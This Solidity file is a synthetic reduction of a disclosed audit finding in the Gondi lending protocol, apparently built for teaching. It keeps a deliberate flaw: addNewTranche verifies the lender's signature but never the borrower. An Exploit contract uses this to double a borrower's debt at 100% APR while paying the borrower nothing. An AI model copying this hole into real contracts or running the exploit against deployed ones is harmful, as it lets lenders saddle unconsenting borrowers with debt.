// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gondi — addNewTranche does not ask the borrower (Code4rena 2024-04, H-12, #35214).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: addNewTranche checks the lender's RenegotiationOffer signature and never
    checks msg.sender against the borrower. A lender offer with fee == principal and a
    100% APR is applied to the borrower's NFT. The borrower receives 0. The lender is
    pulled for the whole fee. Outstanding principal doubles. The NFT stays escrowed.
    The blamed check is preserved verbatim below (@> VULN).

    Repo: code-423n4/2024-04-gondi @ b9863d73c08fcdd2337dc80a8b5e0917e18b036c
    MultiSourceLoan.addNewTranche. */

library Terms {
    uint256 internal constant PRINCIPAL = 1000 ether;
    uint256 internal constant FEE = 1000 ether;
    uint256 internal constant APR = 10_000;
    uint256 internal constant PRECISION = 10_000;
    uint256 internal constant FEE_FRACTION = 10_000;
    uint256 internal constant LOAN_ID = 1;
    uint256 internal constant RENEG_ID = 12;
    uint256 internal constant DURATION = 365 days;
    uint256 internal constant EXPIRY = 4_000_000_000;
    uint256 internal constant TOKEN_ID = 42;
    uint256 internal constant MAX_TRANCHES = 8;
    address internal constant LENDER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address internal constant BORROWER = 0x000000000000000000000000000000000000B0Bb;
    address internal constant OLD_LENDER = 0x000000000000000000000000000000000000B0B5;
    address internal constant PROTOCOL = 0x000000000000000000000000000000000000Fee5;
    address internal constant COLLECTION = 0x000000000000000000000000000000000000C0C0;
}

contract PrincipalToken {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mintAndApprove(address holder, address spender, uint256 amount) external {
        balanceOf[holder] += amount;
        totalSupply += amount;
        allowance[holder][spender] = amount;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (amount == 0) return true;
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MultiSourceLoan {
    uint256 internal constant PRECISION = Terms.PRECISION;
    uint256 internal constant protocolFeeFraction = Terms.FEE_FRACTION;
    address internal constant protocolRecipient = Terms.PROTOCOL;
    uint256 internal constant getMaxTranches = Terms.MAX_TRANCHES;

    bytes32 internal constant RENEGOTIATION_TYPEHASH =
        0x986a160abc209a64a5b0786817ff0aa7a5f5737a4ee6a95197f86290598cd03d;

    struct Tranche {
        uint256 loanId;
        uint256 floor;
        uint256 principalAmount;
        address lender;
        uint256 accruedInterest;
        uint256 startTime;
        uint256 aprBps;
    }

    struct Loan {
        address borrower;
        uint256 nftCollateralTokenId;
        address nftCollateralAddress;
        address principalAddress;
        uint256 principalAmount;
        uint256 startTime;
        uint256 duration;
        Tranche[] tranche;
    }

    struct RenegotiationOffer {
        uint256 renegotiationId;
        uint256 loanId;
        address lender;
        uint256 fee;
        uint256[] trancheIndex;
        uint256 principalAmount;
        uint256 aprBps;
        uint256 expirationTime;
        uint256 duration;
    }

    PrincipalToken public immutable token;
    uint256 public pulledFromLender;
    uint256 public paidToBorrower;
    uint256 public escrowedTokenId;
    mapping(uint256 => bytes32) private _loans;

    constructor(PrincipalToken _token) {
        token = _token;
    }

    function DOMAIN_SEPARATOR() public view returns (bytes32) {
        return keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("GONDI_MULTI_SOURCE_LOAN")),
                keccak256(bytes("3")),
                block.chainid,
                address(this)
            )
        );
    }

    function hashOffer(RenegotiationOffer memory offer) public pure returns (bytes32) {
        bytes memory encodedIndexes;
        uint256 n = offer.trancheIndex.length;
        for (uint256 i; i < n;) {
            encodedIndexes = abi.encodePacked(encodedIndexes, offer.trancheIndex[i]);
            unchecked {
                ++i;
            }
        }
        return keccak256(
            abi.encode(
                RENEGOTIATION_TYPEHASH,
                offer.renegotiationId,
                offer.loanId,
                offer.lender,
                offer.fee,
                keccak256(encodedIndexes),
                offer.principalAmount,
                offer.aprBps,
                offer.expirationTime,
                offer.duration
            )
        );
    }

    function digest(RenegotiationOffer memory offer) public view returns (bytes32) {
        return keccak256(abi.encodePacked(hex"1901", DOMAIN_SEPARATOR(), hashOffer(offer)));
    }

    function hashLoan(Loan memory loan) public pure returns (bytes32) {
        bytes memory packed;
        uint256 n = loan.tranche.length;
        for (uint256 i; i < n;) {
            Tranche memory t = loan.tranche[i];
            packed = abi.encodePacked(
                packed,
                keccak256(
                    abi.encode(t.loanId, t.floor, t.principalAmount, t.lender, t.accruedInterest, t.startTime, t.aprBps)
                )
            );
            unchecked {
                ++i;
            }
        }
        return keccak256(
            abi.encode(
                loan.borrower,
                loan.nftCollateralTokenId,
                loan.nftCollateralAddress,
                loan.principalAddress,
                loan.principalAmount,
                loan.startTime,
                loan.duration,
                keccak256(packed)
            )
        );
    }

    function previewOffer() public pure returns (RenegotiationOffer memory offer) {
        uint256[] memory idx = new uint256[](1);
        idx[0] = 0;
        offer = RenegotiationOffer({
            renegotiationId: Terms.RENEG_ID,
            loanId: Terms.LOAN_ID,
            lender: Terms.LENDER,
            fee: Terms.FEE,
            trancheIndex: idx,
            principalAmount: Terms.PRINCIPAL,
            aprBps: Terms.APR,
            expirationTime: Terms.EXPIRY,
            duration: Terms.DURATION
        });
    }

    function seed(uint256 loanId, Loan memory loan) external {
        require(_loans[loanId] == bytes32(0), "seeded");
        _loans[loanId] = hashLoan(loan);
        escrowedTokenId = loan.nftCollateralTokenId;
    }

    function checkSignature(address signer, bytes32 structHash, bytes calldata signature) public view {
        require(signature.length == 65, "sig len");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(signature.offset)
            s := calldataload(add(signature.offset, 32))
            v := byte(0, calldataload(add(signature.offset, 64)))
        }
        bytes32 typed = keccak256(abi.encodePacked(hex"1901", DOMAIN_SEPARATOR(), structHash));
        address recovered = ecrecover(typed, v, r, s);
        require(recovered == signer && recovered != address(0), "sig");
    }

    function _baseLoanChecks(uint256 loanId, Loan memory loan) private view {
        require(hashLoan(loan) == _loans[loanId], "loan");
        require(loan.startTime + loan.duration >= block.timestamp, "expired");
    }

    function _baseRenegotiationChecks(RenegotiationOffer calldata offer) private view {
        require(offer.principalAmount != 0, "principal");
        require(block.timestamp <= offer.expirationTime, "offer expired");
    }

    function addNewTranche(RenegotiationOffer calldata offer, Loan memory loan, bytes calldata signature)
        external
        returns (uint256, Loan memory)
    {
        uint256 loanId = offer.loanId;
        _baseLoanChecks(loanId, loan);
        _baseRenegotiationChecks(offer);
        // @> VULN: only the lender signature is checked. The borrower does not authorize the tranche.
        this.checkSignature(offer.lender, hashOffer(offer), signature);
        // FIX: require(msg.sender == loan.borrower).
        require(loan.tranche.length != getMaxTranches, "max");

        Loan memory updated = _addNewTranche(loanId + 1, loan, offer);
        _loans[loanId + 1] = hashLoan(updated);
        delete _loans[loanId];

        uint256 toBorrower = offer.principalAmount - offer.fee;
        token.transferFrom(offer.lender, updated.borrower, toBorrower);
        paidToBorrower = toBorrower;
        if (offer.fee > 0) {
            uint256 cut = offer.fee * protocolFeeFraction / PRECISION;
            token.transferFrom(offer.lender, protocolRecipient, cut);
            pulledFromLender = cut;
        }
        return (loanId + 1, updated);
    }

    function _addNewTranche(uint256 newLoanId, Loan memory loan, RenegotiationOffer calldata offer)
        private
        view
        returns (Loan memory)
    {
        uint256 n = loan.tranche.length;
        Tranche[] memory tranches = new Tranche[](n + 1);
        for (uint256 i; i < n;) {
            tranches[i] = loan.tranche[i];
            unchecked {
                ++i;
            }
        }
        tranches[n] = Tranche({
            loanId: newLoanId,
            floor: loan.principalAmount,
            principalAmount: offer.principalAmount,
            lender: offer.lender,
            accruedInterest: 0,
            startTime: block.timestamp,
            aprBps: offer.aprBps
        });
        loan.tranche = tranches;
        loan.principalAmount += offer.principalAmount;
        return loan;
    }
}

contract Exploit {
    // Lender 0xf39F… over digest(previewOffer()) at the loan CREATE address, chain id 1.
    bytes constant LENDER_SIG =
        hex"b9fcc004ac3ba13150edae8f2405bc5a7a615c0a3f35bb85a08c57ccec6be15259ca9f4737354ef9842f4e8cbefde9f9ff2db1fb440e0ee3ec00321093285b8d1b";

    PrincipalToken public token; // CREATE nonce 1
    MultiSourceLoan public loan; // CREATE nonce 2

    constructor() {
        token = new PrincipalToken();
        loan = new MultiSourceLoan(token);
    }

    function lenderSignature() external pure returns (bytes memory) {
        return LENDER_SIG;
    }

    function existingLoan() public view returns (MultiSourceLoan.Loan memory loanState) {
        MultiSourceLoan.Tranche[] memory tranches = new MultiSourceLoan.Tranche[](1);
        tranches[0] = MultiSourceLoan.Tranche({
            loanId: Terms.LOAN_ID,
            floor: 0,
            principalAmount: Terms.PRINCIPAL,
            lender: Terms.OLD_LENDER,
            accruedInterest: 0,
            startTime: block.timestamp,
            aprBps: 1_000
        });
        loanState = MultiSourceLoan.Loan({
            borrower: Terms.BORROWER,
            nftCollateralTokenId: Terms.TOKEN_ID,
            nftCollateralAddress: Terms.COLLECTION,
            principalAddress: address(token),
            principalAmount: Terms.PRINCIPAL,
            startTime: block.timestamp,
            duration: Terms.DURATION,
            tranche: tranches
        });
    }

    function run() external {
        require(msg.sender != Terms.BORROWER, "caller is the borrower");
        MultiSourceLoan.Loan memory openLoan = existingLoan();
        loan.seed(Terms.LOAN_ID, openLoan);
        require(loan.escrowedTokenId() == Terms.TOKEN_ID, "escrow");
        token.mintAndApprove(Terms.LENDER, address(loan), Terms.PRINCIPAL);

        MultiSourceLoan.RenegotiationOffer memory offer = loan.previewOffer();
        (uint256 newId, MultiSourceLoan.Loan memory out) = loan.addNewTranche(offer, openLoan, LENDER_SIG);

        require(newId == 2, "id");
        require(out.borrower == Terms.BORROWER, "borrower");
        require(out.principalAmount == Terms.PRINCIPAL * 2, "debt");
        require(out.nftCollateralTokenId == Terms.TOKEN_ID, "nft");
        require(loan.escrowedTokenId() == Terms.TOKEN_ID, "still escrowed");
        require(out.tranche.length == 2, "tranche");
        require(out.tranche[1].aprBps == Terms.APR, "apr");
        require(out.tranche[1].floor == Terms.PRINCIPAL, "floor");
        require(loan.paidToBorrower() == 0, "borrower cash");
        require(token.balanceOf(Terms.BORROWER) == 0, "borrower balance");
        require(token.balanceOf(Terms.LENDER) == 0, "lender");
        require(token.balanceOf(Terms.PROTOCOL) == Terms.PRINCIPAL, "pulled");
        require(loan.pulledFromLender() == Terms.PRINCIPAL, "cut");
    }
}
